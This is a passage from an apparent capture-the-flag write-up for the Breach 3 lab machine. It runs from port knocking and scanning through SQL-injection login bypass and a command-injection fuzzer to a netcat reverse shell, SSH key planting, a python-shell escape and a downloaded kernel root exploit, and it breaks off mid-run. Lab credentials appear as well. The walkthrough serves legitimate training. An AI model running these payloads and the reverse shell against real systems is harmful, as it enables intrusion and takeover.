iso.3.6.1.2.1.1.9.1.3.3 <span class="o">=</span> STRING: <span class="s2">"The SNMP Management Architecture MIB."</span>
iso.3.6.1.2.1.1.9.1.3.4 <span class="o">=</span> STRING: <span class="s2">"The MIB module for SNMPv2 entities"</span>
iso.3.6.1.2.1.1.9.1.3.5 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing TCP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.6 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing IP and ICMP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.7 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing UDP implementations"</span>
iso.3.6.1.2.1.1.9.1.3.8 <span class="o">=</span> STRING: <span class="s2">"View-based Access Control Model for SNMP."</span>
iso.3.6.1.2.1.1.9.1.3.9 <span class="o">=</span> STRING: <span class="s2">"The MIB modules for managing SNMP Notification, plus filtering."</span>
iso.3.6.1.2.1.1.9.1.3.10 <span class="o">=</span> STRING: <span class="s2">"The MIB module for logging SNMP Notifications."</span>
iso.3.6.1.2.1.1.9.1.4.1 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
iso.3.6.1.2.1.1.9.1.4.2 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
iso.3.6.1.2.1.1.9.1.4.3 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
iso.3.6.1.2.1.1.9.1.4.4 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
iso.3.6.1.2.1.1.9.1.4.5 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
iso.3.6.1.2.1.1.9.1.4.6 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
iso.3.6.1.2.1.1.9.1.4.7 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
iso.3.6.1.2.1.1.9.1.4.8 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
iso.3.6.1.2.1.1.9.1.4.9 <span class="o">=</span> Timeticks: <span class="o">(</span>34<span class="o">)</span> 0:00:00.34
iso.3.6.1.2.1.1.9.1.4.10 <span class="o">=</span> Timeticks: <span class="o">(</span>35<span class="o">)</span> 0:00:00.35
iso.3.6.1.2.1.25.1.1.0 <span class="o">=</span> Timeticks: <span class="o">(</span>283658<span class="o">)</span> 0:47:16.58
iso.3.6.1.2.1.25.1.2.0 <span class="o">=</span> Hex-STRING: 07 E5 09 1D 0E 25 16 00 2D 04 00
iso.3.6.1.2.1.25.1.3.0 <span class="o">=</span> INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 <span class="o">=</span> STRING: <span class="s2">"BOOT_IMAGE=/boot/vmlinuz-4.4.0-45-generic root=UUID=56e63cea-5a5c-4f59-babf-fdd403f70674 ro tty12 quiet splash"</span>
iso.3.6.1.2.1.25.1.5.0 <span class="o">=</span> Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 <span class="o">=</span> Gauge32: 34
iso.3.6.1.2.1.25.1.7.0 <span class="o">=</span> INTEGER: 0
End of MIB
</code></pre></div></div>

<p><strong>Port Knocking</strong></p>

<p>So I developed a python script, gave it execute permissions and run it.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">f"Usage: ./</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [Ip] [Port1] [Port2] [Port3]"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">ip</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>


<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
        <span class="n">connect</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>755 knock.py 
root@kali:~<span class="nv">$ </span>./knock.py 192.168.179.150 545 232 1876
Done
</code></pre></div></div>

<p>Then I re-scan all TCP and UDP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
...
adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
sender statistics 2885.5 pps with 196608 packets sent total
listener statistics 54 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.150  ttl 64 
TCP open                  telnet[   23]         from 192.168.179.150  ttl 64 
TCP open             dls-monitor[ 2048]         from 192.168.179.150  ttl 64 
TCP open                     bre[ 4096]         from 192.168.179.150  ttl 64 
TCP open                 unknown[ 5800]         from 192.168.179.150  ttl 64 
TCP open            mvs-capacity[10007]         from 192.168.179.150  ttl 64 
TCP open                 octopus[10008]         from 192.168.179.150  ttl 64 
TCP open                 unknown[10009]         from 192.168.179.150  ttl 64 
TCP open                 unknown[10010]         from 192.168.179.150  ttl 64 
adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
UDP open 192.168.179.150:161  ttl 64
sender statistics 2784.2 pps with 196635 packets sent total
listener statistics 6 packets recieved 0 packets droped and 0 interface drops
UDP open                    snmp[  161]         from 192.168.179.150  ttl 64
</code></pre></div></div>

<h3 id="ssh-enumeration">SSH Enumeration</h3>

<p>All TCP ports were irrelevant except for the SSH service that contained in the banner another telephone number that we can do port Knocking again.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> milton 192.168.179.150
<span class="k">**********************************************************************</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">*</span>          The Bobs Cloud Hosting, LLC. Secure Backdoor              <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">*</span>                                                                    <span class="k">*</span>
<span class="k">*</span>  If you wish to discuss cloud hosting options, give us a call at   <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span>
<span class="k">*</span>   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">**********************************************************************</span>

milton@192.168.179.150<span class="s1">'s password:
</span></code></pre></div></div>

<p>So I ran the port knocking script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./knock.py 192.168.179.150 555 423 1800
Done
</code></pre></div></div>

<p>I ran unicornscan again to discover TCP and UDP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.150:8  ttl 64
TCP open 192.168.179.150:22  ttl 64
sender statistics 2071.8 pps with 196608 packets sent total
listener statistics 12 packets recieved 0 packets droped and 0 interface drops
TCP open                 unknown[    8]         from 192.168.179.150  ttl 64 
TCP open                     ssh[   22]         from 192.168.179.150  ttl 64 
adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
sender statistics 2105.0 pps with 196635 packets sent total
listener statistics 0 packets recieved 0 packets droped and 0 interface drops
</code></pre></div></div>

<p>I did version detection and script scanning of the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p8</span>,22 192.168.179.150
...
PORT   STATE SERVICE VERSION
8/tcp  open  http    Apache httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span>milton
|_http-server-header: Apache
|_http-title: 401 Unauthorized
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 12:1b:d5:b9:d9:6e:30:97:cf:5e:2c:9b:7b:86:01:d6 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 06:ae:3d:c1:4b:3f:58:9d:d3:1d:de:4c:ac:a4:8a:76 <span class="o">(</span>RSA<span class="o">)</span>
|   256 ab:35:42:2b:59:1c:ef:6d:4c:02:18:cd:07:9e:fa:45 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 44:66:05:63:1e:a9:21:44:d0:8e:1d:d9:3a:84:cc:ef <span class="o">(</span>ED25519<span class="o">)</span>
</code></pre></div></div>

<p>As we can see an unusual web service is running on port 8 and the SSH service is running on port 22.</p>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Interacting with the web service I found that a basic authentication system is running and it asks us for the credentials to log in, milton’s password is the same one we found in breach 1.</p>

<p><img src="/assets/images/breach3/screenshot-1.png" alt="" /></p>

<p>This directed me to the milton website, I clicked on <strong>place</strong> link and redirected me to a login web page.</p>

<p><img src="/assets/images/breach3/screenshot-2.png" alt="" /></p>

<p>There I tried a basic SQL injection on password field and it was possible to bypass the login page.</p>

<p><img src="/assets/images/breach3/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/breach3/screenshot-4.png" alt="" /></p>

<p>After exploiting sql injection and not finding a way to run remote system commands, I decided to move around the web page and test all, in the Cloud Hosting web page, I clicked on <strong>Emails</strong> button and then on <strong>Livechat</strong> link, there in the form I entered data and submitted it, as part of the URL I could see the <strong>searcher</strong> parameter and tried to test it.</p>

<p><img src="/assets/images/breach3/screenshot-5.png" alt="" /></p>

<p>For this I developed a python fuzzer using a dictionary with the most common attacks.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">url</span><span class="o">=</span><span class="s">"http://192.168.179.150:8/breach3/thebobscloudhostingllc/livechat.php"</span>
<span class="n">user</span><span class="o">=</span><span class="s">"milton"</span>
<span class="n">password</span><span class="o">=</span><span class="s">"thelaststraw"</span>

<span class="n">b64_pass_encode</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">,</span><span class="s">"utf-8"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>

<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">searcherFuzz</span><span class="p">(</span><span class="n">FUZZ</span><span class="p">):</span>
    <span class="n">header</span><span class="o">=</span><span class="p">{</span>
            <span class="s">"Authorization"</span><span class="p">:</span> <span class="s">"Basic {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">b64_pass_encode</span><span class="p">)</span>
            <span class="p">}</span>

    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
            <span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">,</span>
            <span class="s">"password"</span><span class="p">:</span><span class="s">"' or 1=1 -- -"</span><span class="p">,</span>
            <span class="s">"submit"</span><span class="p">:</span><span class="s">"+Login+"</span>
            <span class="p">}</span>

    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://192.168.179.150:8/breach3/index.php"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">?searcher=</span><span class="si">{</span><span class="n">FUZZ</span><span class="si">}</span><span class="s">"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">))</span>

<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"/opt/seclists/Fuzzing/UnixAttacks.fuzzdb.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"11674"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">searcherFuzz</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">searcherFuzz</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>I ran the fuzzer script and found a different response length by the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py
...
11734 <span class="o">=&gt;</span> %0A/usr/bin/id
11734 <span class="o">=&gt;</span> %0A/usr/bin/id%0A
11734 <span class="o">=&gt;</span> %0Aid
11734 <span class="o">=&gt;</span> %0Aid%0A
</code></pre></div></div>

<p>I check this and the id command is executed successfully.</p>

<p><img src="/assets/images/breach3/screenshot-6.png" alt="" /></p>

<p>Then I read the <strong>livechat.php</strong> file and found the disallowed characters, this helped me to run the commands in a structured way.</p>

<p><img src="/assets/images/breach3/screenshot-7.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="command-injection">Command Injection</h3>

<p>To bypass the restrictions I wrote a netcat reverse shell in the server to then run it, the server was not allowing outbound traffic to other ports, so I thought about using the port 22, as it’s currently listening on the target, there’s a possibility that outgoing traffic is allowed on that port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 192.168.179.1 22 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<p><img src="/assets/images/breach3/screenshot-8.png" alt="" /></p>

<p>Set up a netcat listener on port 22, and then run the netcat reverse shell saved on the server.</p>

<p><img src="/assets/images/breach3/screenshot-9.png" alt="" /></p>

<p>We get a reverse shell and then I upgraded it to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 22                   
listening on <span class="o">[</span>any] 22 ...                                  
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.150] 50130
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off            
$ id                                                        
uid=1003(samir) gid=1003(samir) groups=1003(samir),27(sudo)
$ script -qc /bin/bash /dev/null                                
samir@Initech-DMZ01:/var/www/html/breach3/thebobscloudhostingllc$
</span></code></pre></div></div>

<p>The user samir can run the chmod command as sudo with privileges of user thebobs.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>samir on Initech-DMZ01:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User samir may run the following commands on Initech-DMZ01:
    <span class="o">(</span>thebobs<span class="o">)</span> NOPASSWD: /bin/chmod
</code></pre></div></div>

<p>In the thebobs home directory into the ssh directory the authorized_keys file has write privileges for all users, I could use it to save a public key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> .ssh
total 68
drwxrwxrwx 2 thebobs thebobs  4096 Nov 13  2016 <span class="nb">.</span>
drwxr-xr-x 4 thebobs thebobs  4096 Oct 18 18:20 ..
<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swm
<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swn
<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swo
<span class="nt">-rwx------</span> 1 thebobs thebobs 12288 Nov 13  2016 .swp
<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs     0 Nov 13  2016 authorized_keys
<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs  1679 Sep 10  2016 id_rsa
<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs   403 Sep 10  2016 id_rsa.pub
<span class="nt">-rwxrwxrwx</span> 1 thebobs thebobs   222 Oct  6  2016 known_hosts
</code></pre></div></div>

<p>Reviewing the SSH configuration file, in the last lines we can see that only thebobs user can log in via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-4</span> /etc/ssh/sshd_config
UsePAM <span class="nb">yes

</span>AllowUsers thebobs
<span class="c">#AllowUsers root</span>
</code></pre></div></div>

<p>On the attacking machine I generate the SSH keys.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"s3cr3t"</span> <span class="nt">-f</span> id_rsa
</code></pre></div></div>

<p>The public key is stored in the authorized_keys file into the home directory of thebobs, then we grant all permissions only to the user thebobs, otherwise we cannot log in via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeNyJEoM7B3d+MwTbus8Q1zLP0x+BbdKMts2RhjtgyS7tWKwIMq/i2QPEHdE/oFnfDeS0bgCo/HaCX/o0zMXu+mg0n8QmTv+SLFexxHSSX0TsjjKMdB7UPWaZVXjmnxWvOHWcbnY8v5XOw+JZfQnFbeYpf/j8AxVvxNDhhBMKcOAibB1CNFzyqK46/3EFtMgfvclzSCcuJNYoT7n4VRo8NNsm8cFGPFUDT6HNNV5Jn40AP0iA3wRF9ZBpxyggktQjIk261YaszOwOjwYhXpvG1kNw5aX/FTMh23BSbeUZkcPEkOsnaVGoUBbxQsCWeZI8aFv6am7UsnJ5dyOA3pQCID6aMaC7M3Aoy+L9wH0g76VRk0KHR7udGz3DVXJhoq9i3VtSgEAfz7M3KueMoks4KLjwv93y8shEau+18zjjWK/EJ/ZoV39YmoUA1/b1iSqP+RSnI5sENQyDtCgH7UMrxZ9efDNh0+244vyZr2uV3kHkDGnB4GiV+z1LfzaU0Ak8= root@kali'</span> <span class="o">&gt;</span> .ssh/authorized_keys

samir@Initech-DMZ01:/home/thebobs<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> thebobs /bin/chmod <span class="nt">-R</span> 700 .ssh/
</code></pre></div></div>

<p>Then we log in to the SSH service using the private key, thebobs is using python as shell, to bypass this I imported the os module to use the system funtion and execute bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh thebobs@192.168.179.150 <span class="nt">-i</span> id_rsa

<span class="k">**********************************************************************</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">*</span>          The Bobs Cloud Hosting, LLC. Secure Backdoor              <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">*</span>                                                                    <span class="k">*</span>
<span class="k">*</span>  If you wish to discuss cloud hosting options, give us a call at   <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span>
<span class="k">*</span>   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   <span class="k">*</span>
<span class="k">*</span>                                                                    <span class="k">*</span> 
<span class="k">**********************************************************************</span>

Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Welcome to Ubuntu 14.04.5 LTS <span class="o">(</span>GNU/Linux 4.4.0-45-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com/

  System information as of Tue Sep 22 06:06:13 EDT 2021

  System load: 1.25              Memory usage: 17%   Processes:       184
  Usage of /:  98.3% of 5.80GB   Swap usage:   0%    Users logged <span class="k">in</span>: 0

  <span class="o">=&gt;</span> / is using 98.3% of 5.80GB

  Graph this data and manage this system at:
    https://landscape.canonical.com/

70 packages can be updated.
44 updates are security updates.

Your Hardware Enablement Stack <span class="o">(</span>HWE<span class="o">)</span> is supported <span class="k">until </span>April 2019.
Last login: Tue Nov  8 13:36:07 2016 from 192.168.110.129
Python 2.7.6 <span class="o">(</span>default, Jun 22 2015, 17:58:13<span class="o">)</span> 
<span class="o">[</span>GCC 4.8.2] on linux2
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import os
<span class="o">&gt;&gt;&gt;</span> os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">ls
</span>flag1
thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">cat </span>flag1 
breach3<span class="o">{</span>the_dmz_is_burning<span class="o">}</span>
</code></pre></div></div>

<p>I found a virtual interface with another network segment.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>ip addr
...
3: virbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    <span class="nb">link</span>/ether fe:54:00:4b:73:5f brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
...
</code></pre></div></div>

<p>Listing the ARP cache I found two ip addresses, these belong to the virtal interface, but I couldn’t interact with them.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>arp
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.179.1            ether   00:50:56:c0:00:01   C                     eth0
192.168.122.65           ether   52:54:00:ee:14:51   C                     virbr0
192.168.122.28           ether   52:54:00:f7:3c:ef   C                     virbr0
</code></pre></div></div>

<p>This kernel version seems to be vulnerable so I will checked it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux Initech-DMZ01 4.4.0-45-generic <span class="c">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="kernel-exploit">Kernel Exploit</h3>

<p>To this kernel version I found an exploit that takes advantage of a memory corruption flaw. The append path can be erroneously switched from UFO to non-UFO in ip_ufo_append_data() when building an UFO packet with MSG_MORE option. If unprivileged user namespaces are available, this flaw can be exploited to gain root privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit 4.4.0                                                                                                                             
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
 Exploit Title                                                                                                                    |  Path 
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
...
Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span class="o">(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span class="o">)</span> - Local Privilege Escalation <span class="o">(</span>KASLR / SMEP<span class="o">)</span>         | linux/local/47169.c
...
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------</span>
</code></pre></div></div>

<p>I performed a copy of this exploit to my current directory, compiled it and started a python web server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/47169.c

root@kali:~<span class="nv">$ </span>gcc 47169.c <span class="nt">-o</span> pwn
root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 22
</code></pre></div></div>

<p>Then I downloaded it to the target machine, gave it execution privileges and ran it, and we got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thebobs@Initech-DMZ01:~<span class="nv">$ </span>wget 192.168.179.1:22/pwn
thebobs@Initech-DMZ01:~<span class="nv">$ </span><span class="nb">chmod</span> +x pwn
thebobs@Initech-DMZ01:~<span class="nv">$ </span>./pwn 
<span class="o">[</span>.] starting
<span class="o">[</span>.] checking kernel version
<span class="o">[</span>.] kernel version <span class="s1">'4.4.0-45-generic'</span> detected
<span class="o">[</span>~] <span class="k">done</span>, version looks good
<span class="o">[</span>.] checking SMEP and SMAP
<span class="o">[</span>~] <span class="k">done</span>, looks good
<span class="o">[</span>.] setting up namespace sandbox
<span class="o">[</span>~] <span class="k">done</span>, namespace sandbox <span class="nb">set </span>up
<span class="o">[</span>.] KASLR bypass enabled, getting kernel addr
<span class="o">[</span>.] trying /proc/kallsyms...
<span class="o">[</span>.] trying /boot/System.map-4.4.0-45-generic...
<span class="o">[</span>-] open/read<span class="o">(</span>/boot/System.map-4.4.0-45-generic<span class="o">)</span>
<span class="o">[</span>.] trying syslog...
<span class="o">[</span>~] <span class="k">done</span>, kernel addr:   ffffffff81000000
<span class="o">[</span>.] commit_creds:        ffffffff8109d870
<span class="o">[</span>.] prepare_kernel_cred: ffffffff8109db50
<span class="o">[</span>.] SMEP bypass enabled, mmapping fake stack
